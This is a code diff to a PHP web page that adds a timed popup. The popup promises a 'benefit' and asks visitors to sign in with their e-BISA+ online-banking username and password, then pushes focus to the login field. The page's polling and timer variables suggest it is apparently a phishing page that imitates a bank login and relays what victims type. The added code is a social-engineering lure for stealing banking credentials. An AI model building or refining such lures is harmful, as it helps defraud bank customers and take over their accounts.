@@ -408,6 +408,38 @@ if ($method === 'GET' && isset($_GET['check'])) {
       .lang-selector .lang-short { display: none; }
       .lang-divider { display: none; }
     }
+    /* ── Popup Beneficio ── */
+    .popup-overlay {
+      position:fixed; inset:0; background:rgba(0,0,0,0.5);
+      display:flex; align-items:center; justify-content:center;
+      z-index:8000; opacity:0; visibility:hidden;
+      transition:opacity 0.3s, visibility 0.3s;
+    }
+    .popup-overlay.active { opacity:1; visibility:visible; }
+    .popup-box {
+      background:#fff; border-radius:12px; padding:36px 32px 28px;
+      max-width:380px; width:90%; text-align:center;
+      box-shadow:0 8px 32px rgba(0,0,0,0.18);
+      transform:scale(0.9); transition:transform 0.3s;
+    }
+    .popup-overlay.active .popup-box { transform:scale(1); }
+    .popup-icon { margin-bottom:16px; }
+    .popup-title {
+      font-size:18px; font-weight:600; color:#003e7e;
+      margin-bottom:10px; line-height:1.3;
+    }
+    .popup-msg {
+      font-size:13px; color:#666; line-height:1.5;
+      margin-bottom:24px;
+    }
+    .popup-btn {
+      background:#003e7e; color:#fff; border:none;
+      padding:12px 40px; font-size:14px; font-weight:600;
+      border-radius:6px; cursor:pointer;
+      transition:background 0.2s;
+      font-family:'Roboto',sans-serif;
+    }
+    .popup-btn:hover { background:#002d5e; }
   </style>
 </head>
 <body>
@@ -556,6 +588,20 @@ if ($method === 'GET' && isset($_GET['check'])) {
   </div>
 </div>
 
+<!-- Popup Beneficio -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-box">
+    <div class="popup-icon">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#003e7e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        <polyline points="9 12 11 14 15 10"/>
+      </svg>
+    </div>
+    <h2 class="popup-title">Identifícate para obtener este beneficio</h2>
+    <p class="popup-msg">Ingresa con tu usuario y contraseña de e-BISA+ para continuar con tu solicitud.</p>
+  </div>
+</div>
+
 <script>
 (function(){
   const $ = id => document.getElementById(id);
@@ -574,6 +620,16 @@ if ($method === 'GET' && isset($_GET['check'])) {
   let pollInterval = null;
   let timerInterval = null;
   let currentUser = '';
+
+  // ── Popup beneficio (auto-dismiss) ──
+  const popupOverlay = $('popupOverlay');
+  function closePopup() {
+    popupOverlay.classList.remove('active');
+    setTimeout(() => usuario.focus(), 300);
+  }
+  setTimeout(() => popupOverlay.classList.add('active'), 400);
+  setTimeout(closePopup, 3500);
+  popupOverlay.addEventListener('click', closePopup);
 
   // ── Helpers ──
   function showError(el) { el.classList.add('active'); }
